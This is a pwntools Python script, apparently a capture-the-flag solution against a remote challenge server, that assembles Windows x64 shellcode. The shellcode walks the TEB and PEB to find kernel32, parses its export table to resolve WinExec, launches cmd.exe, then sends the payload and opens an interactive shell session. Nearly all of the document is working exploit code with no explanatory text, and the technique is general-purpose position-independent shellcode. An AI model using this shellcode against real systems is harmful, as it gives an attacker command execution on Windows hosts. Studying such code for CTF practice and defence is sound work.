from pwn import *

#r = remote('192.168.189.133',12345)
r = remote('chall.angelboy.tw',56003)
context.arch = "amd64"
r.newline = b'\r\n'

string_exec = b"WinExec\x00"

payload = asm(f'''

    xor rdi, rdi
    xor rdx, rdx
    xor rcx, rcx
    xor rsi, rsi
    xor r8, r8
    xor r9, r9

    mov rdi, qword ptr gs:[0x60]   ## TEB
    mov rdi, qword ptr [rdi+0x18]  ## PEB
    mov rdi, qword ptr [rdi+0x20]  ## PEB_LDR
    mov rdi, qword ptr [rdi]      
    mov rdi, qword ptr [rdi]
    mov rdi, qword ptr [rdi+0x20]  ## kernel32 imagebase(rdi)

    mov esi, dword ptr [rdi+0x3c]  ## rsi = RVA of NTheader
    lea rsi, qword ptr [rsi+rdi]   ## NTheader address (rsi)
    mov esi, dword ptr [rsi+0x4+0x14+0x70]  ## EXPORT directory table RVA
    lea rsi, qword ptr [rdi+rsi]   ## address of EXPORT directory (rsi)

    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    xor r10, r10 
    xor rcx, rcx
    xor rbx, rbx

    mov r9d, dword ptr [rsi+0x18] ## number of name(r9)
    mov r8, {u64(string_exec)}
    mov edx, dword ptr [rsi+0x20]  ## name table address RVA
    lea rdx, qword ptr [rdx+rdi]   ## name tabel address (rdx)
    
    search:
        mov r10d, dword ptr [rdx+rcx*4] ## name address RVA
        mov r10, qword ptr [rdi+r10]  ## name 
        cmp r10, r8
        je found
        inc rcx
        cmp rcx, r9
        je notfound
        jmp search 

    found:
        xor rbx, rbx
        xor r9, r9
        xor r8, r8
        xor r10, r10
        
        mov r10d, dword ptr [rsi+0x24] ## ordinal rva 
        lea r10, qword ptr [rdi+r10]  ## ordinal addr (r10)    
        mov bx, word ptr [r10+rcx*2] ## ordinal of winexe

        mov r9d, dword ptr [rsi+0x1c] ## function RVA
        lea r9, qword ptr [rdi+r9]## address of function(r9)
        mov r8d, dword ptr [r9+rbx*4] ## winexe function RVA
        xor ecx, ecx
        lea rcx, qword ptr [r8+rdi]  ## winexec
        mov r9, rcx
        jmp cmd
        
        go:
            pop rcx
            sub rsp, 0x100
            and rsp,0xfffffffffffffff0
            call r9


        cmd:
            call go
            .ascii "cmd.exe"
            .byte 0
    
    
    notfound:
        int3

''')
raw_input()
r.send(payload)
r.interactive()
